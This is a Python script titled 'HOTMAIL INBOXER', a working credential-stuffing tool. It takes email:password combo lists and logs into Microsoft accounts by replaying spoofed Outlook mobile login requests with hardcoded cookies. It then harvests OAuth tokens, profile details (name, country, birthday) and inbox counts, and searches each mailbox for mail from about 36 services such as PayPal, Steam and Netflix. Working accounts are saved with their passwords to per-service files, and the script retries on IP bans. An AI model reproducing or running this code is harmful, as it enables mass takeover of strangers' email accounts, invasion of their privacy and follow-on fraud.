# language: Python 3.10+, file: h.py

import requests
import urllib.parse
import re
import sys
import threading
import os
import time
import random
import uuid
import json
from queue import Queue
from pathlib import Path

try:
    from cfonts import render
except ImportError:
    def render(text, **kwargs):
        return f"=== {text} ==="

class Colors:
    green = "\u001b[92m"
    red = "\u001b[91m"
    yellow = "\u001b[93m"
    cyan = "\u001b[96m"
    magenta = "\u001b[95m"
    white = "\u001b[97m"
    gray = "\u001b[90m"
    bold = "\u001b[1m"
    reset = "\u001b[0m"
    black = "\u001b[30m"
    bg_green = "\u001b[42m"
    bg_red = "\u001b[41m"
    bg_yellow = "\u001b[43m"

SERVICE_SENDERS = {
    "Facebook": {"sender": "security@facebookmail.com"},
    "Instagram": {"sender": "security@mail.instagram.com"},
    "TikTok": {"sender": "register@account.tiktok.com"},
    "Twitter": {"sender": "info@x.com"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com"},
    "Netflix": {"sender": "info@account.netflix.com"},
    "Spotify": {"sender": "no-reply@spotify.com"},
    "Disney+": {"sender": "no-reply@disneyplus.com"},
    "Amazon": {"sender": "auto-confirm@amazon.com"},
    "Trendyol": {"sender": "noreply@trendyol.com"},
    "Hepsiburada": {"sender": "noreply@hepsiburada.com"},
    "N11": {"sender": "noreply@n11.com"},
    "Yemeksepeti": {"sender": "noreply@yemeksepeti.com"},
    "Getir": {"sender": "noreply@getir.com"},
    "Migros": {"sender": "noreply@migros.com.tr"},
    "LCWaikiki": {"sender": "noreply@lcwaikiki.com"},
    "Defacto": {"sender": "noreply@defacto.com.tr"},
    "Papara": {"sender": "noreply@papara.com"},
    "Snapchat": {"sender": "team@snapchat.com"},
    "PayPal": {"sender": "service@paypal.com"},
    "YouTube": {"sender": "no-reply@youtube.com"},
    "Duolingo": {"sender": "no-reply@duolingo.com"},
    "Discord": {"sender": "noreply@discord.com"},
    "Pinterest": {"sender": "noreply@account.pinterest.com"},
    "Apple": {"sender": "noreply@apple.com"},
    "Steam": {"sender": "noreply@steampowered.com"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com"},
    "EpicGames": {"sender": "help@acct.epicgames.com"},
    "Rockstar": {"sender": "noreply@rockstargames.com"},
    "RiotGames": {"sender": "no-reply@riotgames.com"},
    "PUBG": {"sender": "PUBG Mobile"},
    "Roblox": {"sender": "accounts@roblox.com"},
    "Supercell": {"sender": "noreply@id.supercell.com"},
    "Google": {"sender": "no-reply@accounts.google.com"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com"},
}

class LoginError(Exception):
    pass


class HotmailChecker:
    def __init__(self, email: str, password: str):
        self.email = email
        self.password = password
        self.session = requests.Session()
        self.ua = (
            "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
            "Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
        )
        self.session.headers.update({
            "User-Agent": self.ua,
            "Accept-Language": "en-US,en;q=0.9",
        })

        self.code: str | None = None
        self.refresh_token: str | None = None
        self.access_token: str | None = None
        self.outlook_token: str | None = None
        self.cid: str | None = None
        self.profile: dict[str, str] = {}
        self.coid = "3d0f0eea-617a-4b9c-a747-100934dca583"
        self.results: dict[str, dict] = {}

    @staticmethod
    def url_encode(text: str) -> str:
        return urllib.parse.quote(text, safe="")

    def get_cookies(self) -> str:
        return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)

    def extract_code(self, text: str) -> str | None:
        match = re.search(r"[?&]code=([^&#\s\"']+)", text)
        if match:
            return urllib.parse.unquote(match.group(1))
        match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
        if match:
            return match.group(1)
        return None

    def login(self) -> bool:
        us = self.url_encode(self.email)
        ps = self.url_encode(self.password)

        login_url = (
            "https://login.live.com/ppsecure/post.srf"
            "?client_id=0000000048170EF2"
            "&contextid=E5D8A9B73286B7E0"
            "&opid=EED8E3DBCC1AAA6A"
            "&bk=1726223182"
            "&uaid=3d0f0eea617a4b9ca747100934dca583"
            "&pid=15216"
        )

        content = (
            "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf"
            "&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
            "&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24"
            "&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}"
        )

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": (
                "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2"
                "&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL"
                "&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code"
                "&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android"
                "&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583"
                "&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1"
                "&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA"
                "&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey"
                "&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
            ),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "X-Requested-With": "com.microsoft.office.outlook",
        }

        self.session.cookies.set("MSPRequ", "id=N&lt=1726223182&co=1", domain="login.live.com")
        self.session.cookies.set("uaid", "3d0f0eea617a4b9ca747100934dca583", domain="login.live.com")
        self.session.cookies.set("RefreshTokenSso", "Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$", domain="login.live.com")
        self.session.cookies.set("MSPOK", "$uuid-90478d00-dd39-405a-8731-bd22329637de", domain="login.live.com")
        self.session.cookies.set("OParams", "11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId", domain="login.live.com")
        self.session.cookies.set("MicrosoftApplicationsTelemetryDeviceId", "ac497201-f3d3-41a7-883c-c50515eabaca", domain="login.live.com")
        self.session.cookies.set("ai_session", "fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490", domain="login.live.com")
        self.session.cookies.set("MUID", "354ca661609b474d9471b6de17e93df7", domain="login.live.com")
        self.session.cookies.set("MSFPC", "GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403", domain="login.live.com")

        time.sleep(random.uniform(0.2, 0.5))
        resp = self.session.post(login_url, data=content, headers=headers, allow_redirects=True, timeout=30)
        text = resp.text
        url = str(resp.url)
        cookies = self.get_cookies()

        if "Sign in to your Microsoft account" in text:
            raise LoginError("BAD")

        if ",AC:null,urlFedConvertRename" in text:
            raise LoginError("IP BAN")

        if any(k in text for k in (
            "account.live.com/recover?mkt",
            "recover?mkt",
            "account.live.com/identity/confirm?mkt",
            "/Abuse?mkt="
        )):
            raise LoginError("2FA")

        self.code = self.extract_code(url) or self.extract_code(text)

        success = False
        if self.code:
            success = True
        elif "ANON" in cookies:
            success = True
        elif "WLSSC" in cookies:
            success = True
        elif "https://login.live.com/oauth20_desktop.srf" in url:
            success = True
        elif "sSigninName" in text:
            success = True
        elif "access_token" in text or "refresh_token" in text:
            success = True
        elif "window.location" in text and self.extract_code(text):
            success = True
        elif "i0281" not in text and "loginfmt" not in text:
            success = True

        if not success:
            raise LoginError("BAD")

        cid = self.session.cookies.get("MSPCID", "")
        self.cid = cid.upper() if cid else None
        return True

    def get_refresh_token(self) -> bool:
        if not self.code:
            return False

        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = (
            "client_info=1&client_id=0000000048170EF2"
            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            f"&grant_type=authorization_code&code={self.code}"
            "&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Host": "login.microsoftonline.com",
            "return-client-request-id": "false",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32",
            "x-client-SKU": "MSAL.xplat.android",
            "x-client-src-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=30)
            j = resp.json()
            self.refresh_token = j.get("refresh_token")
            self.access_token = j.get("access_token")
            return bool(self.refresh_token and self.access_token)
        except Exception:
            return False

    def get_outlook_token(self) -> bool:
        if not self.refresh_token:
            return False

        odc_url = (
            "https://odc.officeapps.live.com/odc/v2.1/federationprovider"
            "?domain=9188040d-6c67-4c5b-b112-36a304b66dad"
        )
        odc_headers = {
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Enlightened-Hrd-Client": "1",
            "Host": "odc.officeapps.live.com",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)",
            "X-CorrelationId": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "X-Office-Application": "145",
            "X-Office-Platform": "Android",
            "X-Office-Platform-Version": "32",
            "X-Office-Version": "4.2424.2",
            "X-OneAuth-AppId": "com.microsoft.office.outlook",
            "X-OneAuth-AppName": "OutlookOneAuth",
            "X-OneAuth-Version": "2.5.0",
        }
        time.sleep(random.uniform(0.1, 0.3))
        try:
            self.session.get(odc_url, headers=odc_headers, timeout=30)
        except Exception:
            pass

        token_url = (
            "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad"
            "/oauth2/v2.0/token"
        )
        data = (
            "client_info=1&client_id=0000000048170EF2"
            f"&refresh_token={urllib.parse.quote(self.refresh_token, safe='')}"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default"
            "&grant_type=refresh_token"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Host": "login.microsoftonline.com",
            "return-client-request-id": "false",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32",
            "x-client-SKU": "MSAL.xplat.android",
            "x-client-src-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(token_url, data=data, headers=headers, timeout=30)
            j = resp.json()
            self.outlook_token = j.get("access_token")
            return bool(self.outlook_token)
        except Exception:
            return False

    def get_profile(self) -> bool:
        if not self.outlook_token or not self.cid:
            return False

        urls = [
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            "https://substrate.office.com/profileb2/v2.0/me/profile",
        ]

        for url in urls:
            headers = {
                "Accept-Encoding": "gzip",
                "Authorization": f"Bearer {self.outlook_token}",
                "Connection": "Keep-Alive",
                "Host": "substrate.office.com",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583",
            }
            time.sleep(random.uniform(0.1, 0.2))
            try:
                resp = self.session.get(url, headers=headers, timeout=30)
                data = resp.json()
            except Exception:
                continue

            if not self.profile.get("Name"):
                names = data.get("names", [])
                if names:
                    first = str(names[0].get("firstName", "")).strip()
                    last  = str(names[0].get("lastName", "")).strip()
                    display = str(names[0].get("displayName", "")).strip()
                    if display:
                        self.profile["Name"] = display
                    elif first or last:
                        self.profile["Name"] = f"{first} {last}".strip()
                else:
                    name = data.get("displayNameDefault") or data.get("displayName") or data.get("name", "")
                    if name:
                        self.profile["Name"] = name

            if not self.profile.get("Country"):
                cc = ""
                accounts = data.get("accounts", [])
                if accounts:
                    cc = str(accounts[0].get("countryCode", "")).strip()
                if not cc:
                    cc = str(data.get("countryCode", "") or data.get("country", "")
                             or data.get("location", "")).strip()
                if not cc:
                    for k in ("work", "personal", "contact"):
                        sub = data.get(k) or {}
                        if isinstance(sub, dict):
                            cc = str(sub.get("countryCode", "") or sub.get("country", "")).strip()
                            if cc:
                                break
                if cc:
                    self.profile["Country"] = cc

            if not self.profile.get("Birthday"):
                bday_set = False
                for ann in data.get("anniversaries", []) or []:
                    if str(ann.get("type", "")).lower() == "birthday":
                        d = ann.get("day", ""); m = ann.get("month", ""); y = ann.get("year", "")
                        if d or m or y:
                            self.profile["Birthday"] = f"{d}-{m}-{y}"
                            bday_set = True
                        break
                if not bday_set:
                    d = data.get("birthDay", ""); m = data.get("birthMonth", ""); y = data.get("birthYear", "")
                    if d or m or y:
                        self.profile["Birthday"] = f"{d}-{m}-{y}"

        return bool(self.profile.get("Name") or self.profile.get("Country"))

    def get_inbox_count(self) -> int:
        if not self.outlook_token:
            return 0

        url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": self.coid,
            "x-req-source": "Mini",
            "authorization": f"Bearer {self.outlook_token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": self.coid,
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.office.outlook",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(url, headers=headers, timeout=30)
            text = resp.text

            patterns = [
                r'DisplayName\\":\\"Inbox\\",\\"TotalCount\\":(\\d+)',
                r'DisplayName":"Inbox","TotalCount":(\d+)',
                r'"Inbox".*?"TotalCount":(\d+)',
                r'TotalCount":(\d+).*?"Inbox"',
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    total = int(match.group(1))
                    self.profile["Inbox"] = str(total)
                    return total
        except Exception:
            pass
        return 0

    def search_emails(self, keyword: str) -> dict:
        if not self.outlook_token or not self.cid:
            return {"total": 0, "last_msg": ""}

        url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"

        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [
                {
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }
            ],
            "AnswerEntityRequests": [
                {
                    "Query": {"QueryString": keyword},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }
            ],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion", "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification", "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }

        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {self.outlook_token}",
            "X-AnchorMailbox": f"CID:{self.cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }

        time.sleep(random.uniform(0.1, 0.2))
        try:
            resp = self.session.post(url, json=search_payload, headers=headers, timeout=30)
            data = resp.json()

            total = data.get("Total", 0)
            count = 0
            last_message = ""
            results_list = []

            try:
                entity_sets = data.get("EntitySets", [])
                if entity_sets and len(entity_sets) > 0:
                    result_sets = entity_sets[0].get("ResultSets", [])
                    if result_sets and len(result_sets) > 0:
                        results_list = result_sets[0].get("Results", [])
                        count = len(results_list)
                        if results_list and len(results_list) > 0:
                            last_message = (results_list[0].get("ConversationTopic", "") or
                                          results_list[0].get("Preview", "") or
                                          results_list[0].get("Subject", ""))
            except Exception:
                pass

            total_count = max(total, count)
            return {"total": total_count, "last_msg": last_message}
        except Exception:
            return {"total": 0, "last_msg": ""}

    def check_all_services(self) -> dict[str, dict]:
        results = {}
        for service_name, svc_info in SERVICE_SENDERS.items():
            keyword = svc_info["sender"]
            res = self.search_emails(keyword)
            if res["total"] > 0:
                results[service_name] = res
        return results

    def run(self) -> tuple[str, dict, dict]:
        self.login()

        if self.get_refresh_token():
            self.get_outlook_token()
            self.get_profile()
            self.get_inbox_count()
            self.results = self.check_all_services()

            if self.results:
                return "HIT", self.profile, self.results
            else:
                return "FREE", self.profile, {}

        return "BAD", {}, {}

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.retries = 0

    def update(self, stat_type: str):
        with self.lock:
            self.total += 1
            if stat_type == "hit":
                self.hits += 1
            elif stat_type == "free":
                self.free += 1
            elif stat_type == "bad":
                self.bad += 1
            elif stat_type == "retry":
                self.retries += 1

    def display(self):
        with self.lock:
            sys.stdout.write(
                f"\r[+] "
                f"Total: {self.total} | "
                f"Hit: {self.hits} | "
                f"Free: {self.free} | "
                f"Bad: {self.bad} | "
            )
            sys.stdout.flush()

THREADS = 7
MAX_RETRIES = 1

def save_to_service_folder(email: str, password: str, results: dict, profile: dict):
    try:
        results_dir = Path("results")
        results_dir.mkdir(exist_ok=True)

        for service_name, data in results.items():
            safe_name = "".join(c for c in service_name if c.isalnum() or c in " -_").strip()
            if not safe_name:
                safe_name = service_name

            file_path = results_dir / f"{safe_name}.txt"

            profile_info = " | ".join(f"{k}={v}" for k, v in profile.items())
            if profile_info:
                line = f"{email}:{password} | {profile_info} | Messages: {data['total']}\n"
            else:
                line = f"{email}:{password} | Messages: {data['total']}\n"

            with open(file_path, "a", encoding="utf-8") as f:
                f.write(line)

    except Exception:
        pass

def worker(queue: Queue, lock: threading.Lock, stats: Stats):
    while True:
        item = queue.get()
        if item is None:
            queue.task_done()
            break

        email, password = item
        status = "BAD"
        profile = {}
        results = {}

        for attempt in range(MAX_RETRIES + 1):
            try:
                checker = HotmailChecker(email, password)
                status, profile, results = checker.run()
                break
            except LoginError as e:
                err = str(e)
                if err == "2FA":
                    status = "2FA"
                    break
                elif err == "IP BAN":
                    if attempt < MAX_RETRIES:
                        stats.update("retry")
                        with lock:
                            print(f"\n[RETRY] {email} -- IP BAN, retrying...")
                        time.sleep(3)
                        continue
                    status = "BAD"
                    break
                else:
                    status = "BAD"
                    break
            except Exception as e:
                if attempt < MAX_RETRIES:
                    stats.update("retry")
                    with lock:
                        print(f"\n[RETRY] {email} -- {e}")
                    time.sleep(2)
                    continue
                status = "BAD"
                break

        if status == "HIT":
            stats.update("hit")
            service_list = [f"{s}({d['total']})" for s, d in results.items()]
            services_text = " | ".join(service_list)
            profile_text = " | ".join(f"{k}={v}" for k, v in profile.items())

            with lock:
                print(f"\n[HIT] {email}:{password}")
                if profile:
                    print(f"  PROFILE: {profile_text}")
                for svc, data in results.items():
                    print(f"  [+] {svc} ({data['total']} Messages) -- {data['last_msg'][:60]}")

            save_to_service_folder(email, password, results, profile)

        elif status == "FREE":
            stats.update("free")
            profile_text = " | ".join(f"{k}={v}" for k, v in profile.items())

            with lock:
                print(f"\n[FREE] {email}:{password} -- {profile_text}")

        stats.display()
        queue.task_done()

def load_combos(path: str) -> list[tuple[str, str]]:
    combos = []
    p = Path(path)
    if not p.exists():
        print(f"[ERROR] File not found: {path}")
        return []

    with p.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                email, password = line.split(":", 1)
                combos.append((email.strip(), password.strip()))
    return combos

def main():
    os.system("cls" if os.name == "nt" else "clear")

    print(render('HOTMAIL INBOXER', colors=['red', 'blue'], align='center'))
    print(f"{'─'*60}")
    print("─" * 60)

    combo_path = input(f"Combo File Path: ").strip()
    print()
    if not combo_path:
        print(f"Please provide a valid file path")
        sys.exit(1)

    combos = load_combos(combo_path)
    total = len(combos)
    if total == 0:
        print(f"No valid combos found in file")
        sys.exit(1)

    print(f"{'─'*70}\n")

    results_dir = Path("results")
    if results_dir.exists():
        import shutil
        shutil.rmtree(results_dir)

    results_dir.mkdir(exist_ok=True)

    queue = Queue()
    lock = threading.Lock()
    stats = Stats()

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(queue, lock, stats))
        t.start()
        threads.append(t)

    for combo in combos:
        queue.put(combo)

    queue.join()

    for _ in range(THREADS):
        queue.put(None)
    for t in threads:
        t.join()

    print(f"\n\n{'─'*70}")
    print(f"[+] FINISHED [+]")
    print(f"  Total: {stats.total}  |  Hit: {stats.hits}  |  Free: {stats.free}  |  Bad: {stats.bad}")
    print(f"{'─'*70}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n[!] Interrupted by user")
        sys.exit(0)